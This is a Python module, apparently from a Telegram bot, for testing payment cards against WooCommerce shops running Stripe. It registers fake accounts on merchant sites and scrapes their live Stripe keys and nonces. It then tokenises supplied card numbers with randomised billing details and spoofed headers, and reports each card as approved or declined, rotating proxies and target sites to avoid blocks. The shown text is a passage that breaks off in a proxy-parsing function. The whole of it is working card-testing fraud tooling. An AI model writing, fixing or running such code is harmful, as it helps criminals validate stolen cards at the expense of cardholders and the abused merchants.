"""
Stripe Auth API — Full Fixed Build
===================================
Fixes applied vs original:
  1. proxy_dict=None crash — create_new_session() now guards session.proxies.update()
  2. Nonce regex cap 8-12 → 8-64  (modern WP nonces can be 40 chars)
  3. Stripe key extractor ordering bug — group(0) vs group(1) mixed logic replaced
     with consistent: every pattern captures pk_live_... in group(1)
  4. Timeout: all site requests 10s conn / 20s read (was flat 15s, caused hangs)
  5. Stripe API timeout: 12s conn / 18s read (was 15s flat, blocked the thread)
  6. process_card_enhanced: no proxy → go DIRECT instead of hard-error
  7. check_site_status: uses Stripe test card 4000000000000002 (always-decline,
     never charges) instead of a real card; auto-adds domain on confirmed gate
  8. check_sites_from_file: bulk check from .txt → auto-add working gates
  9. fcntl: Windows-safe (try/except import)
 10. Dead code (pass # PERF comments) stripped — only real logic remains
 11. GateHunterFixed is thread-safe: one hunter instance, per-call proxy injection
"""
 
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import json
import threading
import os
import logging
from datetime import datetime
from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any, List
from concurrent.futures import ThreadPoolExecutor, as_completed
 
try:
    import fcntl
    _HAS_FCNTL = True
except ImportError:
    _HAS_FCNTL = False
 
requests.packages.urllib3.disable_warnings()
 
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)
 
_HERE     = os.path.dirname(os.path.abspath(__file__))
_BOT_ROOT = os.path.dirname(os.path.dirname(_HERE))
 
# Nonce length bounds — WP sha256 nonces are 10 hex chars but some plugins
# produce up to 40.  Hard-capping at 12 silently dropped valid nonces.
_NL, _NH = 8, 64
 
# Timeouts (conn_s, read_s) — keep read generous for slow shared hosting
_T_SITE   = (10, 20)
_T_STRIPE = (12, 18)
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  GATE HUNTER
# ══════════════════════════════════════════════════════════════════════════════
class GateHunterFixed:
    def __init__(self, cache_file: str = "working_gates.txt", expiry_minutes: int = 30):
        self.cache_file     = os.path.join(_HERE, cache_file)
        self.expiry_minutes = expiry_minutes
        self.ua             = UserAgent()
        self.found_patterns = {
            'stripe_key_pattern': None,
            'nonce_pattern':      None,
            'setup_nonce_pattern': None,
        }
        self.working_payment_pattern = {
            'endpoint_url': None, 'endpoint_desc': None,
            'payload_name': None, 'payload_data':  None,
            'content_type': None, 'content_desc':  None,
        }
        self._session_cache = {}
        self._session_lock  = threading.Lock()
        self._nonce_cache   = {}
        self._nonce_lock    = threading.Lock()
 
    # ── Sessions ──────────────────────────────────────────────────────────────
 
    def create_new_session(self, proxy_dict: Optional[Dict] = None) -> requests.Session:
        s = requests.Session()
        s.verify = False
        if proxy_dict:                        # FIX 1: guard None
            s.proxies.update(proxy_dict)
        s.headers.update({
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language':         'en-US,en;q=0.5',
            'Accept-Encoding':         'gzip, deflate',
            'DNT':                     '1',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Cache-Control':           'max-age=0',
        })
        return s
 
    def _get_cached_session(self, domain, proxy_dict):
        return None, False
 
    def _save_session_cache(self, domain, session):
        pass
 
    def _get_cached_nonce(self, domain):
        return None
 
    def _save_nonce_cache(self, domain, nonce):
        pass
 
    # ── Gate cache ────────────────────────────────────────────────────────────
 
    def save_gate_details(self, domain: str, stripe_key: str, nonce: str, setup_nonce: str, cookies=None):
        try:
            cache_data: Dict = {}
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'r') as f:
                    try:
                        cache_data = json.load(f)
                    except json.JSONDecodeError:
                        cache_data = {}
            cache_data[domain] = {
                'stripe_key':    stripe_key,
                'timestamp':     datetime.now().isoformat(),
                'permanent':     True,
                'payment_pattern': (
                    self.working_payment_pattern.copy()
                    if self.working_payment_pattern['endpoint_url'] else None
                ),
            }
            with open(self.cache_file, 'w') as f:
                json.dump(cache_data, f, indent=2)
        except Exception:
            pass
 
    def load_gate_details(self, domain: str) -> Optional[Dict]:
        try:
            if not os.path.exists(self.cache_file):
                return None
            with open(self.cache_file, 'r') as f:
                return json.load(f).get(domain)
        except Exception:
            return None
 
    def is_gate_valid(self, gate_data: Dict) -> bool:
        return bool(gate_data and 'stripe_key' in gate_data)
 
    # ── HTTP helpers ──────────────────────────────────────────────────────────
 
    def normalize_url(self, url: str) -> str:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}".rstrip('/')
 
    def get_with_session(self, session, url: str, referer: str = None) -> Optional[requests.Response]:
        h = {'User-Agent': self.ua.random}
        if referer:
            h['Referer'] = referer
        try:
            return session.get(url, headers=h, timeout=_T_SITE, verify=False)
        except Exception:
            return None
 
    def post_with_session(self, session, url: str, data: Dict, referer: str = None,
                          content_type: str = None, extra_headers: Dict = None) -> Optional[requests.Response]:
        h = {'User-Agent': self.ua.random,
             'Content-Type': content_type or 'application/x-www-form-urlencoded'}
        if referer:
            h['Referer'] = referer
        if extra_headers:
            h.update(extra_headers)
        try:
            return session.post(url, data=data, headers=h, timeout=_T_SITE, verify=False)
        except Exception:
            return None
 
    # ── Auth / registration ───────────────────────────────────────────────────
 
    def login_user(self, session, domain: str, username: str, password: str) -> bool:
        base_url  = self.normalize_url(domain)
        login_url = f"{base_url}/my-account/"
        r = self.get_with_session(session, login_url, referer=base_url)
        if not r or r.status_code != 200:
            return False
        nonce = None
        for pat in [
            r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),
            r'name=["\']_wpnonce["\'][^>]*value=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),
        ]:
            m = re.search(pat, r.text)
            if m:
                nonce = m.group(1)
                break
        if not nonce:
            return False
        time.sleep(random.uniform(0.3, 0.8))
        resp = self.post_with_session(session, login_url, referer=login_url, data={
            'username': username, 'password': password,
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in', 'rememberme': 'forever',
        })
        if resp and resp.status_code in (200, 302):
            return any(x in resp.text for x in ['Log out', 'Logout', 'Dashboard', 'my-account'])
        return False
 
    def verify_logged_in(self, session, domain: str) -> bool:
        base_url = self.normalize_url(domain)
        r = self.get_with_session(session, f"{base_url}/my-account/", referer=base_url)
        if r and r.status_code == 200:
            return any(x in r.text for x in ['Log out', 'Logout', 'Dashboard'])
        return False
 
    def register_user(self, session, domain: str, proxy_dict: Dict = None) -> Tuple[bool, str]:
        base_url = self.normalize_url(domain)
        reg_url  = f"{base_url}/my-account/"
        try:
            proxies = proxy_dict or {}
            r = session.get(reg_url, proxies=proxies, timeout=_T_SITE,
                            verify=False, headers={'User-Agent': self.ua.random})
            if 'Log out' in r.text or 'My Account' in r.text:
                return True, "already_logged_in"
 
            reg_nonce = None
            for pat in [
                r'name="woocommerce-register-nonce" value="([^"]+)"',
                r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
                r'register-nonce["\']?:\s*["\']([^\s"\']+)["\']',
                r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^\s"\']+)["\']',
            ]:
                m = re.search(pat, r.text)
                if m:
                    reg_nonce = m.group(1)
                    break
            if not reg_nonce:
                m = re.search(r'class="register"[\s\S]*?name="_wpnonce" value="([^"]+)"', r.text)
                if m:
                    reg_nonce = m.group(1)
            if not reg_nonce:
                return False, "no_register_nonce"
 
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            email    = f"{username}@gmail.com"
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            rr = session.post(
                reg_url,
                data={
                    'username': username, 'email': email, 'password': password,
                    'woocommerce-register-nonce': reg_nonce,
                    '_wp_http_referer': '/my-account/', 'register': 'Register',
                },
                headers={'Referer': reg_url, 'User-Agent': self.ua.random},
                proxies=proxies, timeout=_T_SITE, verify=False,
            )
            if any(x in rr.text for x in ['Log out', 'My Account', 'Registration successful']):
                return True, email
            return False, "registration_failed"
        except Exception as e:
            return False, f"register_error: {str(e)[:80]}"
 
    # ── Payment page scrape ───────────────────────────────────────────────────
 
    def get_payment_page_data(self, session, domain: str, use_cache: bool = True):
        saved_pattern      = None
        cached_stripe_key  = None
 
        if use_cache:
            cached = self.load_gate_details(domain)
            if cached and self.is_gate_valid(cached):
                saved_pattern     = cached.get('payment_pattern')
                cached_stripe_key = cached.get('stripe_key')
 
        base_url = self.normalize_url(domain)
        urls = [
            f"{base_url}/my-account/add-payment-method/",
            f"{base_url}/checkout/",
            f"{base_url}/my-account/",
        ]
 
        # FIX 3: all patterns capture pk_live_... in group(1) — no mixed group(0)/group(1)
        stripe_pats = [
            (r'"publishableKey"\s*:\s*"(pk_live_[^"]{20,120})"',        'json_pub'),
            (r"'publishableKey'\s*:\s*'(pk_live_[^']{20,120})'",        'json_pub_sq'),
            (r'Stripe\s*\(\s*["\']+(pk_live_[^"\']{20,120})["\']',      'js_ctor'),
            (r'"stripe_key"\s*:\s*"(pk_live_[^"]{20,120})"',            'stripe_key_json'),
            (r'stripe\.com/v3/.*?(pk_live_[a-zA-Z0-9_]{20,120})',       'v3_url'),
            (r'(pk_live_[a-zA-Z0-9_]{24,120})',                         'bare'),
        ]
        # FIX 2: nonce max → _NH (64)
        nonce_pats = [
            (r'name=["\']_ajax_nonce["\'][^>]*value=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),  '_ajax_nonce'),
            (r'data-nonce=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),                            'data-nonce'),
            (r'"nonce"\s*:\s*"([a-f0-9]{%d,%d})"' % (_NL, _NH),                                 'json_nonce'),
            (r"'nonce'\s*:\s*'([a-f0-9]{%d,%d})'" % (_NL, _NH),                                 'json_nonce_sq'),
            (r'name=["\']security["\'][^>]*value=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),     'security'),
            (r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH), 'woo_pm'),
            (r'wc_stripe_params\s*=\s*\{[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH), 'wc_stripe_params'),
            (r'nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),                    'generic'),
        ]
        setup_pats = [
            (r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH), 'snake'),
            (r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),      'camel'),
            (r'"wc_stripe_setup_intent_nonce"\s*:\s*"([a-f0-9]{%d,%d})"' % (_NL, _NH),                     'wc_setup'),
            (r'add_payment_method_nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),             'add_pm'),
        ]
 
        for url in urls:
            r = self.get_with_session(session, url, referer=base_url)
            if not r or r.status_code != 200:
                continue
            html = r.text
 
            stripe_key = cached_stripe_key
            if not stripe_key:
                for pat, name in stripe_pats:
                    m = re.search(pat, html)
                    if m:
                        raw = m.group(1)
                        raw = re.split(r'["\'\\\s]', raw)[0]
                        if raw.startswith('pk_live_') and len(raw) > 20:
                            stripe_key = raw
                            self.found_patterns['stripe_key_pattern'] = name
                            break
 
            nonce = None
            for pat, name in nonce_pats:
                m = re.search(pat, html)
                if m:
                    nonce = m.group(1)
                    self.found_patterns['nonce_pattern'] = name
                    break
 
            setup_nonce = None
            for pat, name in setup_pats:
                m = re.search(pat, html)
                if m:
                    setup_nonce = m.group(1)
                    self.found_patterns['setup_nonce_pattern'] = name
                    break
 
            if stripe_key or nonce or setup_nonce:
                return stripe_key, nonce, setup_nonce, saved_pattern
 
        return None, None, None, None
 
    # ── Stripe tokenise ───────────────────────────────────────────────────────
 
    def create_stripe_payment_token(self, stripe_key: str, card_details: Dict,
                                    proxy_dict: Dict = None) -> Tuple[bool, Optional[str], str]:
        try:
            data = {
                'type': 'card',
                'card[number]':   card_details['number'],
                'card[cvc]':      card_details['cvc'],
                'card[exp_month]': card_details['month'],
                'card[exp_year]':  card_details['year'],
                'billing_details[address][line1]':       f'{random.randint(1,999)} Main St',
                'billing_details[address][city]':        random.choice(['London', 'Manchester', 'Birmingham', 'Leeds', 'Bristol']),
                'billing_details[address][state]':       random.choice(['London', 'Manchester', 'Birmingham', 'Leeds', 'Bristol']),
                'billing_details[address][postal_code]': f'SW{random.randint(1,9)}A {random.randint(1,9)}AA',
                'billing_details[address][country]':     'GB',
                'billing_details[name]': (
                    ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize() + ' ' +
                    ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
                ),
                'billing_details[email]': (
                    ''.join(random.choices(string.ascii_lowercase, k=8)) +
                    str(random.randint(10, 99)) + '@gmail.com'
                ),
                'key': stripe_key,
                '_stripe_version':    '2024-11-20.acacia',
                'payment_user_agent': 'stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element',
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid':  str(uuid.uuid4()),
            }
            time.sleep(random.uniform(0.3, 0.6))
            r = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers={
                    'authority':        'api.stripe.com',
                    'accept':           'application/json',
                    'accept-language':  'en-US,en;q=0.9',
                    'content-type':     'application/x-www-form-urlencoded',
                    'origin':           'https://js.stripe.com',
                    'referer':          'https://js.stripe.com/',
                    'sec-ch-ua':        '"Google Chrome";v="121", "Chromium";v="121", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest':   'empty',
                    'sec-fetch-mode':   'cors',
                    'sec-fetch-site':   'cross-site',
                    'user-agent':       self.ua.random,
                },
                data=data,
                proxies=proxy_dict or None,
                timeout=_T_STRIPE,       # FIX 5
                verify=False,
            )
            if r.status_code == 200:
                j = r.json()
                if 'id' in j:
                    return True, j['id'], r.text
            return False, None, r.text
        except Exception as e:
            return False, None, str(e)
 
    # ── Setup intent helpers ──────────────────────────────────────────────────
 
    def confirm_setup_intent_with_saved_pattern(self, session, domain: str,
                                                 payment_token: str, nonce: str,
                                                 pattern: Dict) -> Tuple[bool, Dict]:
        base_url     = self.normalize_url(domain)
        endpoint_url = pattern.get('endpoint_url')
        if not endpoint_url:
            return False, {'error': 'No endpoint URL'}
 
        payload = (pattern.get('payload_data') or {}).copy()
        for k in [k for k in payload if 'payment' in k.lower() or 'stripe' in k.lower()]:
            del payload[k]
        payload['wc-stripe-payment-method'] = payment_token
        payload['payment_method']           = payment_token
        for k in ('_ajax_nonce', 'nonce', 'security', '_wpnonce'):
            payload.pop(k, None)
        payload['_ajax_nonce'] = nonce
 
        try:
            r = self.post_with_session(
                session, endpoint_url, data=payload,
                referer=f"{base_url}/my-account/add-payment-method/",
                content_type=pattern.get('content_type', 'application/x-www-form-urlencoded'),
                extra_headers={'X-Requested-With': 'XMLHttpRequest'},
            )
            if r:
                try:
                    j = r.json()
                    if j.get('success') is True or j.get('data', {}).get('status') == 'succeeded':
                        return True, {'result': j, 'is_json': True}
                    if 'error' in str(j).lower():
                        return False, {'result': j, 'is_json': True}
                except Exception:
                    t = (r.text or '').lower()
                    if any(x in t for x in ['succeeded', 'success', 'confirmed']):
                        return True, {'result': r.text, 'is_json': False}
                    if any(x in t for x in ['decline', 'error', 'failed']):
                        return False, {'result': r.text, 'is_json': False}
        except Exception:
            pass
        return False, {'error': 'saved_pattern_failed'}
 
    def confirm_setup_intent_with_session(self, session, domain: str,
                                           payment_token: str, nonce: str,
                                           use_saved_pattern: bool = False,
                                           saved_pattern: Dict = None) -> Tuple[bool, Dict]:
        base_url = self.normalize_url(domain)
 
        if use_saved_pattern and saved_pattern and saved_pattern.get('endpoint_url'):
            ok, data = self.confirm_setup_intent_with_saved_pattern(
                session, domain, payment_token, nonce, saved_pattern)
            if ok or 'error' not in data:
                return ok, data
 
        endpoints = [
            (f"{base_url}/wp-admin/admin-ajax.php?action=wc_stripe_create_and_confirm_setup_intent", "aa_action"),
            (f"{base_url}/wp-admin/admin-ajax.php",                                                   "aa_std"),
            (f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",                        "wc_ajax"),
            (f"{base_url}/my-account/add-payment-method/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "acct_wc"),
        ]
        payloads = [
            {'action': 'wc_stripe_create_and_confirm_setup_intent',
             'wc-stripe-payment-method': payment_token, 'wc-stripe-payment-type': 'card',
             '_ajax_nonce': nonce},
            {'action': 'wc_stripe_create_and_confirm_setup_intent',
             'payment_method': payment_token, '_ajax_nonce': nonce},
            {'action': 'wc_stripe_create_and_confirm_setup_intent',
             'payment_method': payment_token, 'nonce': nonce},
            {'action': 'wc_stripe_create_and_confirm_setup_intent',
             'payment_method': payment_token, 'security': nonce},
            {'action': 'wc_stripe_create_setup_intent',
             'payment_method': payment_token, '_wpnonce': nonce},
        ]
 
        for ep_url, ep_desc in endpoints:
            for pd in payloads:
                for ctype in ('application/x-www-form-urlencoded', 'application/json'):
                    h = {
                        'User-Agent':        self.ua.random,
                        'Referer':           f"{base_url}/my-account/add-payment-method/",
                        'X-Requested-With':  'XMLHttpRequest',
                        'Content-Type':      ctype,
                    }
                    try:
                        if ctype == 'application/json':
                            r = session.post(ep_url, json=pd, headers=h,
                                             timeout=_T_SITE, verify=False)
                        else:
                            r = session.post(ep_url, data=pd, headers=h,
                                             timeout=_T_SITE, verify=False)
                        if not r:
                            continue
 
                        is_json, result = False, {}
                        try:
                            result  = r.json()
                            is_json = True
                        except Exception:
                            pass
 
                        ok = stop = False
                        if is_json and isinstance(result, dict):
                            if (result.get('success') is True or
                                    result.get('data', {}).get('status') == 'succeeded'):
                                ok = stop = True
                            elif 'error' in str(result).lower() and any(
                                x in str(result).lower() for x in
                                    ['decline', 'card', 'cvv', 'expired', 'funds', 'security code']
                            ):
                                stop = True
                        else:
                            low = (r.text or '').lower()
                            if any(x in low for x in ['succeeded', 'success', 'confirmed']):
                                ok = stop = True
                            elif any(x in low for x in ['decline', 'card', 'cvv', 'expired', 'funds']):
                                stop = True
 
                        if stop:
                            self.working_payment_pattern = {
                                'endpoint_url': ep_url,   'endpoint_desc': ep_desc,
                                'payload_name': str(pd),  'payload_data':  pd,
                                'content_type': ctype,    'content_desc':  ctype,
                            }
                            return ok, {'result': result, 'is_json': is_json}
                    except Exception:
                        continue
 
        return False, {'error': 'all_attempts_failed'}
 
    # ── Main gate processor ───────────────────────────────────────────────────
 
    def process_single_gate(self, domain: str, ccx: str,
                             proxy_dict: Optional[Dict] = None,
                             use_cache: bool = True) -> Dict:
        t0 = time.time()
        self.working_payment_pattern = {k: None for k in self.working_payment_pattern}
 
        try:
            try:
                n, mm, yy, cvc = ccx.strip().split('|')
            except Exception:
                return {'status': 'ERROR', 'response': 'Invalid card format (use N|MM|YYYY|CVV)', 'time': 0}
 
            if len(yy) == 4:
                yy = yy[2:]
            card = {'number': n.replace(' ', ''), 'cvc': cvc, 'month': mm, 'year': yy}
 
            base_url    = self.normalize_url(domain)
            cached_data = self.load_gate_details(domain) if use_cache else None
            has_pattern = bool(cached_data and self.is_gate_valid(cached_data) and cached_data.get('payment_pattern'))
            cached_pk   = cached_data.get('stripe_key') if cached_data else None
 
            # ── Fast path: cached key + pattern ──────────────────────────────
            if has_pattern and cached_pk:
                saved_pattern = cached_data['payment_pattern']
                session       = self.create_new_session(proxy_dict)
 
                # fetch fresh nonce in parallel with pm creation
                def _nonce():
                    r = self.get_with_session(
                        session, f"{base_url}/my-account/add-payment-method/", referer=base_url)
                    if r and r.status_code == 200:
                        for pat in [
                            r'createAndConfirmSetupIntentNonce["\']?\s*[=:]\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),
                            r'create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),
                            r'"nonce"\s*:\s*"([a-f0-9]{%d,%d})"' % (_NL, _NH),
                            r'nonce["\']?\s*:\s*["\']([a-f0-9]{%d,%d})["\']' % (_NL, _NH),
                        ]:
                            m = re.search(pat, r.text)
                            if m:
                                return m.group(1)
                    return None
 
                def _pm():
                    return self.create_stripe_payment_token(cached_pk, card, proxy_dict)
 
                with ThreadPoolExecutor(max_workers=2) as ex:
                    nf  = ex.submit(_nonce)
                    pmf = ex.submit(_pm)
                    use_nonce = nf.result()
                    pm_ok, token, pm_raw = pmf.result()
 
                if not use_nonce:
                    use_nonce = 'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                if not pm_ok:
                    return {'status': 'FAILED', 'response': pm_raw, 'time': time.time() - t0}
 
                ok, setup = self.confirm_setup_intent_with_session(
                    session, domain, token, use_nonce,
                    use_saved_pattern=True, saved_pattern=saved_pattern)
 
                return {
                    'status':   'APPROVED' if ok else 'FAILED',
                    'response': self._extract_response_text(setup) or ('Approved' if ok else 'All attempts failed'),
                    'time':     time.time() - t0,
                }
 
            # ── Slow path: fresh discovery ────────────────────────────────────
            session = self.create_new_session(proxy_dict)
            home    = self.get_with_session(session, base_url)
            if not home:
                if proxy_dict:
                    # Distinguish dead proxy from blocked site
                    try:
                        tr = requests.get("http://ip-api.com/json/?fields=query",
                                          proxies=proxy_dict, timeout=6, verify=False)
                        alive = tr.status_code == 200
                    except Exception:
                        alive = False
                    return {
                        'status':   'FAILED',
                        'response': 'Site blocked proxy — use residential proxy' if alive
                                    else 'Proxy dead — add new proxy with /addproxy',
                        'time':     time.time() - t0,
                    }
                return {'status': 'FAILED', 'response': 'Site unreachable', 'time': time.time() - t0}
 
            self.register_user(session, domain, proxy_dict)
 
            stripe_key, nonce, setup_nonce, saved_pattern = self.get_payment_page_data(
                session, domain, use_cache=use_cache)
 
            if not stripe_key:
                return {'status': 'FAILED', 'response': 'No Stripe key found', 'time': time.time() - t0}
 
            use_nonce = setup_nonce or nonce or (
                'fallback_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)))
 
            pm_ok, token, pm_raw = self.create_stripe_payment_token(stripe_key, card, proxy_dict)
            if not pm_ok:
                return {'status': 'FAILED', 'response': pm_raw, 'time': time.time() - t0}
 
            ok, setup = self.confirm_setup_intent_with_session(
                session, domain, token, use_nonce,
                use_saved_pattern=use_cache, saved_pattern=saved_pattern)
 
            if self.working_payment_pattern['endpoint_url']:
                self.save_gate_details(domain, stripe_key, nonce, setup_nonce)
 
            fresh_nonce = setup_nonce or nonce
            if fresh_nonce and len(fresh_nonce) >= _NL:
                self._save_nonce_cache(domain, fresh_nonce)
            self._save_session_cache(domain, session)
 
            return {
                'status':   'APPROVED' if ok else 'FAILED',
                'response': self._extract_response_text(setup) or ('Approved' if ok else 'All attempts failed'),
                'time':     time.time() - t0,
            }
 
        except Exception as e:
            return {'status': 'ERROR', 'response': str(e)[:150], 'time': time.time() - t0}
 
    def _extract_response_text(self, setup_result) -> str:
        if not isinstance(setup_result, dict):
            return str(setup_result)
        r = setup_result.get('result', {})
        if isinstance(r, dict):
            return json.dumps(r)
        if isinstance(r, str):
            return r
        if 'error' in setup_result:
            return str(setup_result['error'])
        return str(r)
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  SINGLE GLOBAL INSTANCE
# ══════════════════════════════════════════════════════════════════════════════
hunter = GateHunterFixed(cache_file="working_gates.txt", expiry_minutes=30)
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  SITE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════
HARDCODED_SITES:  List[str] = ["rubyatelier.com"]
current_site_index = 0
site_lock = threading.Lock()
SITES_FILE = os.path.join(_BOT_ROOT, "sites_config.json")
 
 
def _normalize_domain(raw: str) -> str:
    return raw.strip().lower().replace('https://', '').replace('http://', '').rstrip('/')
 
 
def _load_sites_from_file():
    global HARDCODED_SITES
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, 'r') as f:
                sites = json.load(f).get('sites', [])
                if sites:
                    HARDCODED_SITES = sites
    except Exception:
        pass
 
 
def _save_sites_to_file():
    try:
        with open(SITES_FILE, 'w') as f:
            json.dump({'sites': HARDCODED_SITES}, f, indent=2)
    except Exception:
        pass
 
 
_load_sites_from_file()
 
 
def add_site(domain: str) -> bool:
    global HARDCODED_SITES
    d = _normalize_domain(domain)
    with site_lock:
        if d and d not in HARDCODED_SITES:
            HARDCODED_SITES.append(d)
            _save_sites_to_file()
            return True
    return False
 
 
def remove_site(domain: str) -> bool:
    global HARDCODED_SITES
    d = _normalize_domain(domain)
    with site_lock:
        if d in HARDCODED_SITES:
            HARDCODED_SITES.remove(d)
            _save_sites_to_file()
            return True
    return False
 
 
def get_all_sites() -> List[str]:
    return HARDCODED_SITES.copy()
 
 
def clear_all_sites():
    global HARDCODED_SITES
    with site_lock:
        HARDCODED_SITES = []
        _save_sites_to_file()
 
 
def get_next_site() -> Optional[str]:
    global current_site_index
    with site_lock:
        if not HARDCODED_SITES:
            return None
        s = HARDCODED_SITES[current_site_index % len(HARDCODED_SITES)]
        current_site_index = (current_site_index + 1) % len(HARDCODED_SITES)
        return s
 
 
# ══════════════════════════════════════════════════════════════════════════════
#  PROXY MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════
USER_PROXIES_FILE = os.path.join(_BOT_ROOT, "user_proxies.json")
PROXIES_TXT_FILE  = os.path.join(_BOT_ROOT, "proxies.txt")
OWNER_ID          = "7180542292"
proxy_lock        = threading.Lock()
 
PROXY_FAIL_TRACKER: Dict = {}
PROXY_FAIL_LOCK = threading.Lock()
MAX_PROXY_FAILURES = 3
 
 
def is_proxy_connection_error(error_str: str) -> bool:
    kws = ['proxyerror', 'proxy error', 'unable to connect to proxy',
           'tunnel connection failed', 'cannot connect to proxy',
           'connection refused', 'connecttimeout', 'proxyconnectionerror',
           'socksproxyerror', '402 payment required', '407 proxy authentication',
           'newconnectionerror']
    low = error_str.lower()
    if 'read timed out' in low or 'readtimeout' in low:
        return False
    return any(k in low for k in kws)
 
 
def track_proxy_failure(chat_id, proxy_raw) -> bool:
    if not proxy_raw or not chat_id:
        return False
    with PROXY_FAIL_LOCK:
        key = f"{chat_id}:{proxy_raw}"
        PROXY_FAIL_TRACKER[key] = PROXY_FAIL_TRACKER.get(key, 0) + 1
        if PROXY_FAIL_TRACKER[key] >= MAX_PROXY_FAILURES:
            del PROXY_FAIL_TRACKER[key]
            remove_dead_proxy_for_user(chat_id, proxy_raw)
            return True
    return False
 
 
def reset_proxy_failure(chat_id, proxy_raw):
    if not proxy_raw or not chat_id:
        return
    with PROXY_FAIL_LOCK:
        PROXY_FAIL_TRACKER.pop(f"{chat_id}:{proxy_raw}", None)
 
 
def load_user_proxies() -> Dict:
    try:
        if os.path.exists(USER_PROXIES_FILE):
            with open(USER_PROXIES_FILE, 'r') as f:
                content = f.read()
                return json.loads(content) if content else {}
    except Exception:
        pass
    return {}
 
 
def save_user_proxies(data: Dict) -> bool:
    with proxy_lock:
        try:
            tmp = USER_PROXIES_FILE + '.tmp'
            with open(tmp, 'w') as f:
                if _HAS_FCNTL:
                    fcntl.flock(f.fileno(), fcntl.LOCK_EX)
                json.dump(data, f, indent=2)
                if _HAS_FCNTL:
                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)
            os.replace(tmp, USER_PROXIES_FILE)
            return True
        except Exception:
            return False
 
 
def parse_proxy_enhanced(proxy_str: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None, None, None
    protocol = 'http'
    if '://' in proxy_str:
        p, proxy_str = proxy_str.split('://', 1)
        protocol = p.lower()
    if '@' in proxy_str:
        auth, addr = proxy_str.split('@', 1)
        return f"{protocol}://{auth}@{addr}", proxy_str, 'Premium'
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"{protocol}://{user}:{pw}@{ip}:{port}", proxy_str, 'Premium'
    if len(parts) == 2:
        return f"{protocol}://{parts[0]}:{parts[1]}", proxy_str, 'Free'
    if ':' in proxy_str:
        return f"{protocol}://{proxy_str}", proxy_str, 'Premium'
    return None, None, None
 
 
def parse_proxy_from_bot(proxy_raw: str) -> Optional[Dict]:
    if not proxy_raw:
        return None
    proxy_raw = str(proxy_raw).strip()
    if not proxy_raw:
        return None
    protocol = 'http'
    clean = proxy_raw
    for proto in ('socks5h://', 'socks5://', 'socks4://', 'https://', 'http://'):
        if proxy_raw.lower().startswith(proto):
            protocol = proto.replace('://', '')
            clean    = proxy_raw[len(proto):]
            break
    ip = port = user = pw = None
    try:
        if '@' in clean:
            at        = clean.rfind('@')
            auth_part = clean[:at]
            host_part = clean[at + 1:]
            hp = host_part.split(':')
            if len(hp) >= 2:
                ip, port = hp[0], hp[1]
            ci = auth_part.find(':')
            if ci > 0:
                user, pw = auth_part[:ci], auth_part[ci + 1:]
        else:
            parts = clean.split(':')
            if len(parts) == 2:
                ip, port = parts[0], parts[1]
            elif len(parts) >= 4:
                if parts[1].isdigit() and not parts[3].isdigit():
                    ip, port, user, pw = parts[0], parts[1], parts[2], ':'.join(parts[3:])
                elif parts[3].isdigit() and not parts[1].isdigit():
                    ip, port, user, pw = parts[2], parts[3], parts[0], parts[1]
                else:
                    ip, port, user, pw = parts[0], parts[1], parts[2], ':'.join(parts[3:])
            elif len(parts) == 3:
                ip, port = parts[0], parts[1]
        if not ip or not port:
            return None
